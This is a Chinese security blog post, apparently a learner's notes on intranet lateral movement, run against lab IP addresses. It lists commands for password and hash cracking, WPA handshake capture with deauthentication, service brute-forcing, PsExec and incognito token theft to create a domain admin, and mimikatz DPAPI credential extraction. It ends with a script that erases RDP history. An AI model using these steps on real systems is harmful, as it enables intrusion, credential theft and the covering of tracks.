@@ -1,0 +1,381 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 内网横向渗透2</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>内网横向渗透<hanla></hanla>2 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/10/14
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/内网篇">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span>
+                内网篇
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p><hanla></hanla>1.<hanla></hanla>获取了<hanla></hanla>hash<br>cmd5   md5 破解网站，解不出来的情况下<br><hanla></hanla>可以尝试  hashcat<hanla></hanla>本地离线破解  </p>
+<span id="more"></span>
+
+<p><hanla></hanla>pwddump7  读取<hanla></hanla>hash  破解  </p>
+<p><hanla></hanla>st2<hanla></hanla>代码执行漏洞  权限很大可以读取<hanla></hanla>shadow<hanla></hanla>文件<br><hanla></hanla>cat  /etc/shadow  &gt;1.txt  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7sVX"><img src="https://s3.jpg.cm/2021/10/14/Io7sVX.png" alt="Io7sVX.png"></a></p>
+<h3 id="john"><a href="#john" class="headerlink" title="john"></a>john</h3><pre><code><hanla></hanla>破解<hanla></hanla>windows<hanla></hanla>密码
+用
+hashdump7<hanla></hanla>或者<hanla></hanla>mimikatz 导出<hanla></hanla>windowshash<hanla></hanla>为<hanla></hanla>pass.txt
+john –format=NT pass.txt
+
+破解<hanla></hanla>Linux shadow<hanla></hanla>文件
+john --format=sha512crypt shadow&nbsp; //john<hanla></hanla>暴力破解密码
+john --w:password.lst--format=sha512crypt shadow&nbsp; //john<hanla></hanla>字典暴力破解密码
+
+用<hanla></hanla>pwdump 7 把<hanla></hanla>hash<hanla></hanla>导入文件里面
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7Nbu"><img src="https://s3.jpg.cm/2021/10/14/Io7Nbu.png" alt="Io7Nbu.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7YD4"><img src="https://s3.jpg.cm/2021/10/14/Io7YD4.png" alt="Io7YD4.png"></a></p>
+<h3 id="Fcrackzip"><a href="#Fcrackzip" class="headerlink" title="Fcrackzip"></a>Fcrackzip</h3><pre><code><hanla></hanla>apt-get install fcrackzip
+
+fcrackzip -b -c1 -u test.zip
+&nbsp;(－b 指定模式为暴破，-c1<hanla></hanla>指定密码类型为纯数字，其它类型可以<hanla></hanla>rtfm,
+-u<hanla></hanla>这个参数非常重要不然不显示破解出来的密码,-l 5-6<hanla></hanla>可以指定长度)
+命令：fcrackzip -b -ca -l 1-4 -u 压缩文件
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;解释：-b 暴力破解模式 -c 指定掩码类型（a=a-z;1=0-9;!=<hanla></hanla>特殊字符） -l 密码长度 -u 压缩文件名
+
+&nbsp;&nbsp; 
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u 压缩文件名
+&nbsp;&nbsp; 
+解释：-D 为使用字典&nbsp; -p<hanla></hanla>为使用字符串作为初始密码文件
+在本机搞了一个压缩文件<hanla></hanla>aa.zip
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7tLz"><img src="https://s3.jpg.cm/2021/10/14/Io7tLz.png" alt="Io7tLz.png"></a></p>
+<h3 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h3><pre><code><hanla></hanla>该软件用于暴力破解压缩文件的密码，但仅支持<hanla></hanla>RAR, ZIP, 7Z<hanla></hanla>这三种类型的压缩包
+执行命令: rarcrack 文件名 -threads 线程数 -type rar|zip|7z
+
+rarcrack&nbsp;test.rar&nbsp;--10&nbsp;--rar
+
+
+如果允许出现错误
+那么可以执行
+sudo apt-get install libxml2-dev libxslt-dev<hanla></hanla>进行修复。
+</code></pre>
+<h3 id="wifi密码破解"><a href="#wifi密码破解" class="headerlink" title="wifi密码破解"></a><hanla></hanla>wifi<hanla></hanla>密码破解</h3><p>这有篇文章可以看一下<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44545251/article/details/100279827"><hanla></hanla>https://blog.csdn.net/weixin_44545251/article/details/100279827</a></p>
+<p><hanla></hanla>把网卡插上去，选择虚拟机<hanla></hanla>kali</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7S4G"><img src="https://s3.jpg.cm/2021/10/14/Io7S4G.png" alt="Io7S4G.png"></a></p>
+<p><hanla></hanla>如果连接成功会出现一个<hanla></hanla>wlan0<br><hanla></hanla>我没有成功<br>可以隐藏自己<br><hanla></hanla>mac<hanla></hanla>地址<br><hanla></hanla>修改器欺骗，或者买一个<hanla></hanla>usb<hanla></hanla>无线网卡，禁用本地  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7m76"><img src="https://s3.jpg.cm/2021/10/14/Io7m76.png" alt="Io7m76.png"></a></p>
+<pre><code><hanla></hanla>输入：ifconfig 查看网卡
+第一步：先输入<hanla></hanla>airmon-ng check kill<hanla></hanla>结束进程
+第二步：输入：airmon-ng start wlan0（对应网卡） 开启监听模式
+第三步：他会自动创建一个 wlan0mon<hanla></hanla>接口 记住这个 接口名 而不是以前的<hanla></hanla>mon0
+第四步：建立监听 airodump-ng wlan0mon 
+第五步：airodump-ng -c 4 -w result --bssid 目标<hanla></hanla>mac  wlan0mon  抓包
+第六步：aireplay-ng -0 10 -a 目标<hanla></hanla>ap<hanla></hanla>的<hanla></hanla>mac -c 客户端<hanla></hanla>mac wlan0mon
+第七步：aircrack-ng -w  字典文件 捕获<hanla></hanla>cap<hanla></hanla>数据库文件 xx.cap
+</code></pre>
+<p><hanla></hanla>第五步：  c<hanla></hanla>信道<hanla></hanla>6   mac<hanla></hanla>地址</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7EFD"><img src="https://s3.jpg.cm/2021/10/14/Io7EFD.png" alt="Io7EFD.png"></a></p>
+<p>第六步<br>发十个攻击包<br>上线</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7v2E"><img src="https://s3.jpg.cm/2021/10/14/Io7v2E.png" alt="Io7v2E.png"></a></p>
+<p>重新上线会发包，然后破解那个包</p>
+<h3 id="ftp爆破工具"><a href="#ftp爆破工具" class="headerlink" title="ftp爆破工具"></a><hanla></hanla>ftp<hanla></hanla>爆破工具</h3><p>菜单–参数—指定要爆破的网段</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7Fyp"><img src="https://s3.jpg.cm/2021/10/14/Io7Fyp.png" alt="Io7Fyp.png"></a></p>
+<p><hanla></hanla>web<hanla></hanla>服务器 分析搭建平台<br><hanla></hanla>如果是系统<hanla></hanla>iis<hanla></hanla>自带的<hanla></hanla>ftp 你爆破<hanla></hanla>ftp<hanla></hanla>作用不大也要尝试  </p>
+<p>c:/inetwpub/www/qxw21238123/<br><hanla></hanla>阿里云，爆这个账号就行了<br><hanla></hanla>一般数据库，ftp<hanla></hanla>名称是一样的<br>他会拦截，阿里云跑阿里云（找白名单，实验室，运营机房的）<br>软件集成搭建网站软件<br><hanla></hanla>ftp<hanla></hanla>服务器的软件 g6 severu filezille<br><hanla></hanla>ceshi  test  admin   这些测试账号有时候权限很大，有时候能直接控制<hanla></hanla>www<hanla></hanla>目录，批量写马  </p>
+<h3 id="3389爆破"><a href="#3389爆破" class="headerlink" title="3389爆破"></a><hanla></hanla>3389<hanla></hanla>爆破</h3><p><hanla></hanla>还是爆<hanla></hanla>445<hanla></hanla>协议，快一点</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7pNT"><img src="https://s3.jpg.cm/2021/10/14/Io7pNT.png" alt="Io7pNT.png"></a></p>
+<h3 id="phpmyadmin爆破"><a href="#phpmyadmin爆破" class="headerlink" title="phpmyadmin爆破"></a><hanla></hanla>phpmyadmin<hanla></hanla>爆破</h3><p><hanla></hanla>有时候<hanla></hanla>ip<hanla></hanla>访问有可能找到意想不到的结果<br>很多就是弱口令<br><hanla></hanla>/phpmyadmin<br>999<br>888  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQGSC"><img src="https://s3.jpg.cm/2021/10/14/IoQGSC.png" alt="IoQGSC.png"></a></p>
+<p>爆破工具很多，目的是爆服务，拿权限</p>
+<h3 id="shell控制连接"><a href="#shell控制连接" class="headerlink" title="shell控制连接"></a><hanla></hanla>shell<hanla></hanla>控制连接</h3><p><hanla></hanla>假如爆<hanla></hanla>445 smb<hanla></hanla>服务<br>爆破成功，但是没开<br><hanla></hanla>3389 telnet 怎么</p>
+<h4 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h4><pre><code><hanla></hanla>获取本地账号密码，构造跳板
+获取明文密码可以用<hanla></hanla>getpss.exe
+获取账号<hanla></hanla>hash<hanla></hanla>可以用<hanla></hanla>pwdum7
+通过得到的账号密码信息链接跳板机
+psexec.exe \\192.168.18.128 -u administrator -p xiaoxiao123 cmd
+psexec.exe \\192.168.200.11 -u administrator -p 123123 cmd
+incognito.exe list_tokens -u  查看本机可以利用的<hanla></hanla>token
+incognito.exe -h 192.168.200.11 -u admin -p 123123 list_tokens -u  
+查看远程机器可以利用的<hanla></hanla>token
+C:\incognito2&gt;incognito.exe -h 192.168.200.11 -u admin -p 123123 execute -c "NT
+AUTHORITY\SYSTEM" cmd.exe  
+调用远程机器的本地系统权限的<hanla></hanla>cmd.exe
+
+调用远程<hanla></hanla>cmd 走到<hanla></hanla>smb<hanla></hanla>服务
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7ZQ5"><img src="https://s3.jpg.cm/2021/10/14/Io7ZQ5.png" alt="Io7ZQ5.png"></a></p>
+<p><hanla></hanla>开<hanla></hanla>3389<hanla></hanla>连接<br>这个防火墙会拦截  </p>
+<p>incognito 烂土豆提权的时候用过<br><hanla></hanla>incognito.exe -h 192.168.18.128 -u xiao -p 123.com list_tokens -u<br>incognito.exe -h 192.168.18.128 -u administrator -p xiaoxiao123 list_tokens -u<br><hanla></hanla>开始用普通用户连不上，用<hanla></hanla>administrator xiaoxiao123<hanla></hanla>才连上  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQPRR"><img src="https://s3.jpg.cm/2021/10/14/IoQPRR.png" alt="IoQPRR.png"></a></p>
+<p><hanla></hanla>可以用它提权，劫持<hanla></hanla>system<hanla></hanla>权限，看运气<br><hanla></hanla>incognito.exe -h 192.168.18.128 -u administrator -p xiaoxiao123   execute -c “NTAUTHORITY\SYSTEM” cmd.exe<br><hanla></hanla>注意<hanla></hanla>nt  authotity\system 之间有空格，  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Io7M9r"><img src="https://s3.jpg.cm/2021/10/14/Io7M9r.png" alt="Io7M9r.png"></a></p>
+<p>普通用户也可以导，</p>
+<h3 id="查找被攻击的计算机中是否有DA的token"><a href="#查找被攻击的计算机中是否有DA的token" class="headerlink" title="查找被攻击的计算机中是否有DA的token"></a><hanla></hanla>查找被攻击的计算机中是否有<hanla></hanla>DA<hanla></hanla>的<hanla></hanla>token</h3><p><hanla></hanla>假设我们现在有<hanla></hanla>xy 域<br><hanla></hanla>xy/xiao  123.com<br><hanla></hanla>xy/administrator<hanla></hanla>登录过就会有域管理员残留的身份<br><hanla></hanla>假设此时域管理员登录过这台<hanla></hanla>win7<br><hanla></hanla>在用<hanla></hanla>pikachu<hanla></hanla>身份登录这台计算机  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQI3t"><img src="https://s3.jpg.cm/2021/10/14/IoQI3t.png" alt="IoQI3t.png"></a></p>
+<p><hanla></hanla>incognito.exe -h 192.168.43.70 -u administrator -p cracer123 list_tokens -u  查看远程机器可以利用的<hanla></hanla>token<br><hanla></hanla>连不上不知道为什么  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQRuz"><img src="https://s3.jpg.cm/2021/10/14/IoQRuz.png" alt="IoQRuz.png"></a></p>
+<p>最后知道是盗版的原因</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQqBu"><img src="https://s3.jpg.cm/2021/10/14/IoQqBu.png" alt="IoQqBu.png"></a></p>
+<p>劫持域管理员身份</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQWOG"><img src="https://s3.jpg.cm/2021/10/14/IoQWOG.png" alt="IoQWOG.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQ584"><img src="https://s3.jpg.cm/2021/10/14/IoQ584.png" alt="IoQ584.png"></a></p>
+<p><hanla></hanla>利用<hanla></hanla>DA<hanla></hanla>的<hanla></hanla>token<hanla></hanla>创建新的<hanla></hanla>DA<br>C:\incognito2&gt;incognito.exe -h 192.168.200.11 -u admin -p 123123   execute -c “CRA<br>CER\ADMINISTRATOR” cmd.exe<br><hanla></hanla>调用<hanla></hanla>DA<hanla></hanla>的<hanla></hanla>cmd.exe<br><hanla></hanla>执行创建<hanla></hanla>DA<hanla></hanla>命令<br><hanla></hanla>Net user x 123.com /add /domain<br>Net group “domain admins” x /add /domain  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQ7mX"><img src="https://s3.jpg.cm/2021/10/14/IoQ7mX.png" alt="IoQ7mX.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQXBh"><img src="https://s3.jpg.cm/2021/10/14/IoQXBh.png" alt="IoQXBh.png"></a></p>
+<p><hanla></hanla>1.<hanla></hanla>扫描端口<br><hanla></hanla>2.<hanla></hanla>爆<hanla></hanla>445<hanla></hanla>端口<br><hanla></hanla>3.<hanla></hanla>可以使用<hanla></hanla>psexec 登录<hanla></hanla>cmd<br><hanla></hanla>4.incognito  劫持<hanla></hanla>token  如果有域管理员<hanla></hanla>token  劫持<hanla></hanla>da 创建一个域管理员出来  </p>
+<h3 id="linux-下通过smbclient访问windows共享目录"><a href="#linux-下通过smbclient访问windows共享目录" class="headerlink" title="linux 下通过smbclient访问windows共享目录"></a><hanla></hanla>linux 下通过<hanla></hanla>smbclient<hanla></hanla>访问<hanla></hanla>windows<hanla></hanla>共享目录</h3><pre><code><hanla></hanla>1.1. 首先安装<hanla></hanla>smbclient
+yum install samba-client
+or
+apt install samba-client
+1，列出某个<hanla></hanla>IP<hanla></hanla>地址所提供的共享文件夹
+smbclient -L 198.168.0.1 -U username -W domain (会提示输密码)
+smbclient -L 198.168.0.1 -U username%password -W domain
+2,<hanla></hanla>像<hanla></hanla>FTP<hanla></hanla>客户端一样使用<hanla></hanla>smbclient
+smbclient //192.168.0.1/tmp -U username -W domain (会提示输密码)
+smbclient //192.168.0.1/tmp -U username%password -W domain
+执行<hanla></hanla>smbclient<hanla></hanla>命令成功后，进入<hanla></hanla>smbclient<hanla></hanla>环境，出现提示符： smb:/&gt;
+这里有许多命令和<hanla></hanla>ftp<hanla></hanla>命令相似，如<hanla></hanla>cd 、lcd、get、megt、put、mput<hanla></hanla>等。通过这些命令，我们可以访问远程主机的共享资源。
+3,<hanla></hanla>直接一次性使用<hanla></hanla>smbclient<hanla></hanla>命令
+smbclient -c "ls" //192.168.0.1/tmp -U username%password
+和
+smbclient //192.168.0.1/tmp -U username%password
+smb:/&gt;ls
+功能一样的
+例，创建一个共享文件夹
+smbclient -c "mkdir share1" //192.168.0.1/tmp -U username%password
+如果用户共享<hanla></hanla>//192.168.0.1/tmp<hanla></hanla>的方式是只读的，会提示
+NT_STATUS_ACCESS_DENIED making remote directory /share1
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQcOS"><img src="https://s3.jpg.cm/2021/10/14/IoQcOS.png" alt="IoQcOS.png"></a></p>
+<h3 id="本地rdp密码读取"><a href="#本地rdp密码读取" class="headerlink" title="本地rdp密码读取"></a><hanla></hanla>本地<hanla></hanla>rdp<hanla></hanla>密码读取</h3><p><hanla></hanla>利用<hanla></hanla>mimikatz<hanla></hanla>查看<hanla></hanla>rdp<hanla></hanla>连接密码  </p>
+<p><hanla></hanla>查看 rdp<hanla></hanla>链接记录<br><hanla></hanla>在<hanla></hanla>powershell<hanla></hanla>下查看<br><hanla></hanla>get-executionpolicy   查看安全策略<br><hanla></hanla>Set-ExecutionPolicy Unrestricted  改变访问策略<br><hanla></hanla>运行查看<hanla></hanla>rdp<hanla></hanla>链接记录的脚本（需在连接时保存记住连接）<br>.\x.ps1<br><hanla></hanla>在<hanla></hanla>dos<hanla></hanla>命令下查看<br><hanla></hanla>Cmdkey /list  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQA1Q"><img src="https://s3.jpg.cm/2021/10/14/IoQA1Q.png" alt="IoQA1Q.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQ8RE"><img src="https://s3.jpg.cm/2021/10/14/IoQ8RE.png" alt="IoQ8RE.png"></a></p>
+<p><hanla></hanla>查找本地的<hanla></hanla>Credentials （凭据）  </p>
+<p>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<br><hanla></hanla>得到路径<br><hanla></hanla>C:\Users\Administrator\AppData\Local\Microsoft\Credentials<br>2853D1A8E8F9614144AC01FCEBCA8CF2   </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQ63T"><img src="https://s3.jpg.cm/2021/10/14/IoQ63T.png" alt="IoQ63T.png"></a></p>
+<p>mimikatz dpapi::cred /in:C:\Users\admin\AppData\Local\Microsoft\Credentials\B93F20E3814289A543FF1E3C8651D734<br><hanla></hanla>接下来需要使用的就是<hanla></hanla>guidMasterKey、pbData<hanla></hanla>数据。<br><hanla></hanla>pbData<hanla></hanla>是凭据的加密数据，guidMasterKey<hanla></hanla>是凭据的<hanla></hanla>GUID  </p>
+<p><hanla></hanla>x64<hanla></hanla>的<hanla></hanla>mimikat<hanla></hanla>在<hanla></hanla>08<hanla></hanla>里面用比较好 03<hanla></hanla>会报错  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQbAW"><img src="https://s3.jpg.cm/2021/10/14/IoQbAW.png" alt="IoQbAW.png"></a></p>
+<h4 id="使用sekurlsa-dpapi"><a href="#使用sekurlsa-dpapi" class="headerlink" title="使用sekurlsa::dpapi"></a><hanla></hanla>使用<hanla></hanla>sekurlsa::dpapi</h4><p><hanla></hanla>根据目标凭据<hanla></hanla>GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}<hanla></hanla>找到其关联的<hanla></hanla>MasterKey，<br><hanla></hanla>这个<hanla></hanla>MasterKey<hanla></hanla>就是加密凭据的密钥，即解密<hanla></hanla>pbData<hanla></hanla>所必须的东西。<br>mimikatz.exe “”privilege::debug”” “”sekurlsa::dpapi full”” exit &gt;&gt; c:\log.txt<br><hanla></hanla>运行这条命令能在<hanla></hanla>c<hanla></hanla>盘生成一个<hanla></hanla>log.txt<br><hanla></hanla>找到与刚刚对应的<hanla></hanla>guid<hanla></hanla>值  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQum2"><img src="https://s3.jpg.cm/2021/10/14/IoQum2.png" alt="IoQum2.png"></a></p>
+<h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><p><hanla></hanla>mimikatz.exe</p>
+<p>dpapi::cred /in:C:\Users\admin\AppData\Local\Microsoft\Credentials\B93F20E3814289A543FF1E3C8651D734 /masterkey:d593ccbad93afbac9c94a598e6c4f992d844ac2c2958aa6bba2eedd7c407e0a4dbb5425810b87c67fbf94a39da71e2bdfa2a6767d351ec674c8ae6901147ba70</p>
+<p><hanla></hanla>前面是你刚刚的路径后面是你的<hanla></hanla>masterkey<hanla></hanla>值<br>然后就能读出账号和密码了  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IoQ1TH"><img src="https://s3.jpg.cm/2021/10/14/IoQ1TH.png" alt="IoQ1TH.png"></a></p>
+<h3 id="清除RDP连接历史记录"><a href="#清除RDP连接历史记录" class="headerlink" title="清除RDP连接历史记录"></a><hanla></hanla>清除<hanla></hanla>RDP<hanla></hanla>连接历史记录</h3><pre><code><hanla></hanla>清除就相对简单一些。
+HKCU:\Software\Microsoft\Terminal Server Client\
+由于在删除<hanla></hanla>Server<hanla></hanla>表项的时候无法一次选择所有表项，因为可以直接删除整个<hanla></hanla>Server<hanla></hanla>再新建。
+除了删除注册表之外，要需要删除默认的<hanla></hanla>RDP<hanla></hanla>连接文件
+@echo off
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f # 删除<hanla></hanla>Default<hanla></hanla>中的所有值
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f # 删除整个<hanla></hanla>Servers
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" 重新创建删除的注册表项
+cd %userprofile%\documents\ # 转到<hanla></hanla>Default.rdp<hanla></hanla>文件目录
+attrib Default.rdp -s -h # 更改<hanla></hanla>Default.rdp<hanla></hanla>文件属性，默认情况下它是隐藏
+del Default.rdp  # 删除文件<hanla></hanla>Default.rdp<hanla></hanla>文
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
